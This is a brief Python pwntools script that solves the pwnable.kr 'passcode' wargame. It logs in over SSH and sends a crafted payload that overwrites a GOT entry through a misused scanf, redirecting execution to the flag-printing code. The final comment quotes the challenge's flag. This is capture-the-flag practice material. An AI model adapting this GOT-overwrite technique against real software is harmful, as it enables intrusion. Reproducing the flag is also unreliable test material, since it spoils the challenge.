from pwn import *


con = ssh("passcode", "pwnable.kr", 2222, "guest")
argv = ["/home/passcode/passcode"]
sh = con.process(argv, executable=argv[0])
sh.sendline("A"*96 + p32(0x804a000) + str(0x80485e3))
print(sh.recvall())

# Sorry mom.. I got confused about scanf usage :(
